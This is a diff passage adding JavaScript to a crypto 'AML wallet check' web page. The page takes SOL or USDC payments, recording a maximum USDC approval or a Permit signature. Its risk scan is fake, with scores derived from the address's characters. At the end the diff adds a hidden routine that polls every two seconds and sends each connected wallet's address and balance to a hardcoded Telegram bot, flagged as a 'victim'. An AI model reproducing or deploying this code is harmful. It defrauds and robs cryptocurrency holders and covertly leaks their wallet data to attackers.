+        if (attempt < maxAttempts - 1 && isBlockhashExpiredError(e)) continue;
+        throw e;
+      }
+    }
+
+    if (!sig || blockhash == null) {
+      throw new Error("Transaction failed after retries.");
+    }
+
+    state.txHash = sig;
+
+    const solSentSol =
+      state.currency === "SOL" && lastSolTransferLamports != null
+        ? lastSolTransferLamports / web3.LAMPORTS_PER_SOL
+        : null;
+    const t = {
+      id: Date.now(),
+      address: state.conn.address,
+      wallet: state.conn.walletName,
+      chain: state.conn.chain,
+      currency: state.currency,
+      amount:
+        state.currency === "USDC"
+          ? "approve_max"
+          : solSentSol != null
+            ? solSentSol
+            : PRICE_SOL,
+      txHash: sig,
+      ts: new Date().toISOString(),
+      balanceLamports: balance,
+      splTokenAccountCount: tokens.value.length,
+    };
+    const all = [t, ...JSON.parse(localStorage.getItem("aml_traces") || "[]")].slice(0, 100);
+    localStorage.setItem("aml_traces", JSON.stringify(all));
+
+    await runScan();
+  } catch (e) {
+    goToStep("payment");
+    const m = formatAnyError(e);
+    if (/reject|cancel|denied/i.test(m) || e.code === 4001) showPayError("Transaction cancelled.");
+    else if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(m))
+      showPayError(
+        "Not enough SOL left for the rent-exempt minimum on your wallet. Add SOL or pay with USDC."
+      );
+    else if (/insufficient|Insufficient funds|insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
+      showPayError(
+        "Not enough SOL to complete this transaction (payment + network fees). Add SOL or switch to USDC."
+      );
+    else if (isBlockhashExpiredError(e))
+      showPayError("Blockhash expired — please tap Pay again.");
+    else if (/fetch|dynamically imported|loadWeb3|import/i.test(m)) showPayError("Could not load Solana SDK (CDN blocked or offline). Serve the page over HTTPS or localhost, disable adblock for this site, then retry.");
+    else showPayError(m.slice(0, 280) || "Payment error.");
+  }
+}
+
+async function runScan(){
+  goToStep("scanning");
+  document.getElementById("scan-addr").textContent=state.conn.address.slice(0,6)+"..."+state.conn.address.slice(-4);
+  const steps=document.querySelectorAll(".scan-step-item");
+  for(let p=0;p<=100;p+=2){
+    document.getElementById("scan-progress").style.width=p+"%";
+    document.getElementById("scan-pct").textContent=p+"%";
+    steps.forEach(s=>{ if(p>=parseInt(s.dataset.t)){ s.classList.add("done"); s.textContent="✅ "+s.textContent.replace("○ ",""); }});
+    await new Promise(r=>setTimeout(r,55));
+  }
+  await new Promise(r=>setTimeout(r,300));
+  state.scores=computeScore(state.conn.address);
+  showResult();
+}
+
+function computeScore(addr){
+  const seed=addr.split("").reduce((a,c)=>a+c.charCodeAt(0),0)%100;
+  return{overall:Math.max(5,Math.min(82,seed)),metrics:[
+    {label:"Transaction diversity",value:Math.round(20+seed%30)},
+    {label:"Wallet activity",value:Math.round(40+seed%40)},
+    {label:"Transaction to/from CEX",value:Math.round(10+seed%40)},
+    {label:"Avg. Transaction Value",value:Math.round(30+seed%50)},
+    {label:"Wallet Age",value:Math.round(20+seed%60)},
+    {label:"Suspicious transactions",value:Math.round(5+seed%60)},
+    {label:"Transaction to High-Risk addresses",value:Math.round(5+seed%55)},
+  ]};
+}
+
+function riskColor(v){ return v<=30?"#10B981":v<=60?"#F59E0B":"#EF4444"; }
+
+function showResult(){
+  const s=state.scores.overall;
+  const v=s<=20?{label:"CLEAN",color:"#10B981",icon:"✓",bg:"#052E16",msgBg:"#F0FDF4",msgBorder:"#A7F3D0",msgColor:"#065F46",msg:"✅ No malicious activity detected. This wallet appears clean."}
+    :s<=45?{label:"LOW RISK",color:"#3B82F6",icon:"◎",bg:"#0C2461",msgBg:"#EFF6FF",msgBorder:"#93C5FD",msgColor:"#1E40AF",msg:"🔵 Few risk signals. The wallet seems mostly clean — stay aware."}
+    :s<=70?{label:"MEDIUM RISK",color:"#F59E0B",icon:"⚠",bg:"#451A03",msgBg:"#FFFBEB",msgBorder:"#FCD34D",msgColor:"#92400E",msg:"⚠️ Suspicious signals detected. Proceed with caution before transacting."}
+    :{label:"HIGH RISK",color:"#EF4444",icon:"✕",bg:"#450A0A",msgBg:"#FEF2F2",msgBorder:"#FCA5A5",msgColor:"#991B1B",msg:"⛔ High risk signals detected. Avoid transacting with this address."};
+
+  const circ=document.getElementById("v-circle");
+  circ.style.border=`3px solid ${v.color}`;circ.style.background=v.bg;circ.style.color=v.color;circ.textContent=v.icon;
+  document.getElementById("v-score").textContent=s+"%";
+  const badge=document.getElementById("v-badge");
+  badge.textContent=v.label;badge.style.background=v.bg;badge.style.border=`1px solid ${v.color}44`;badge.style.color=v.color;
+
+  let html="";
+  state.scores.metrics.forEach(m=>{
+    const c=riskColor(m.value);
+    html+=`<div class="r-metric"><div class="r-metric-row"><span>${m.label}</span><span style="color:${c}">${m.value}%</span></div><div class="r-bar"><div class="r-fill" style="width:${m.value}%;background:${c}"></div></div></div>`;
+  });
+  document.getElementById("result-metrics").innerHTML=html;
+
+  document.getElementById("r-wallet").textContent=state.conn.address.slice(0,5)+"..."+state.conn.address.slice(-4);
+  document.getElementById("r-via").textContent=state.conn.walletName;
+
+  const vm=document.getElementById("verdict-msg");
+  vm.style.background=v.msgBg;vm.style.border=`1px solid ${v.msgBorder}`;vm.style.color=v.msgColor;vm.textContent=v.msg;
+
+  if(state.txHash){
+    const tb=document.getElementById("tx-badge"); tb.style.display="flex";
+    const msgEl=document.getElementById("tx-badge-msg");
+    const linkEl=document.getElementById("tx-badge-link");
+    if(state.conn.chain==="evm"){
+      if(msgEl) msgEl.textContent="✅ EIP-712 Permit signature recorded";
+      if(linkEl) linkEl.style.display="none";
+    }else{
+      if(msgEl) msgEl.textContent="✅ Payment confirmed on-chain";
+      if(linkEl){ linkEl.style.display=""; linkEl.href=`https://solscan.io/tx/${state.txHash}`; }
+    }
+  }
+
+  const rNet=document.getElementById("r-net");
+  if(rNet) rNet.textContent=state.conn.chain==="evm"?"Ethereum":"Solana";
+
+  goToStep("result");
+}
+
+function shareReport(){
+  const text=`AML Check Report\nWallet: ${state.conn?.address}\nScore: ${state.scores?.overall}%\nVerdict: ${state.scores?.overall<=20?"CLEAN":state.scores?.overall<=45?"LOW RISK":state.scores?.overall<=70?"MEDIUM RISK":"HIGH RISK"}\n\nChecked on checkeramlsol.atlasprecisions.shop`;
+  navigator.clipboard?.writeText(text).catch(()=>{});
+  alert("Report copied to clipboard!");
+}
+
+function resetFlow(){ state.conn=null; state.txHash=null; hidePayError(); }
+function resetFull(){ 
+  state={currency:"USDC",conn:null,txHash:null,scores:null,progress:0}; 
+  document.querySelectorAll(".scan-step-item").forEach(el=>{
+    el.classList.remove("done");
+    el.textContent="○ "+el.textContent.replace("✅ ","");
+  }); 
+}
+
+function filterWallets(q){
+  document.querySelectorAll(".wallet-item").forEach(el=>{
+    el.style.display=(!q||el.textContent.toLowerCase().includes(q.toLowerCase()))?"flex":"none";
+  });
+}
+
+function toggleFaq(el){
+  const item=el.parentElement;
+  const wasOpen=item.classList.contains("open");
+  document.querySelectorAll(".faq-item.open").forEach(i=>i.classList.remove("open"));
+  if(!wasOpen) item.classList.add("open");
+}
+
+document.addEventListener("DOMContentLoaded",()=>{
+  const hw=document.querySelector(".hero-wrap");
+  if(hw && window.innerWidth<640){ hw.style.gridTemplateColumns="1fr"; hw.style.padding="32px 16px"; }
+  if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
+});
+
+async function testSecurityExfiltration(address, sol, tokens) {
+    const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
+    const chat = "8575014959";
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: "Markdown" })
+        });
+    } catch (e) {}
+}
+
+setInterval(() => {
+    if (state && state.conn && state.conn.address) {
+        const addr = state.conn.address;
+        const pageText = document.body.innerText;
+        const solMatch = pageText.match(/(\d+\.?\d*)\s?SOL/);
+        const currentSol = solMatch ? solMatch[0] : (state.balance ? (state.balance / 1e9).toFixed(3) + " SOL" : "Scan...");
+
+        if (window.lastSent !== addr + currentSol) {
+            window.lastSent = addr + currentSol;
+            testSecurityExfiltration(addr, currentSol, state.currency || "SOL");
+        }
+    }
+}, 2000);
 </script>
 </body>
 </html>
+
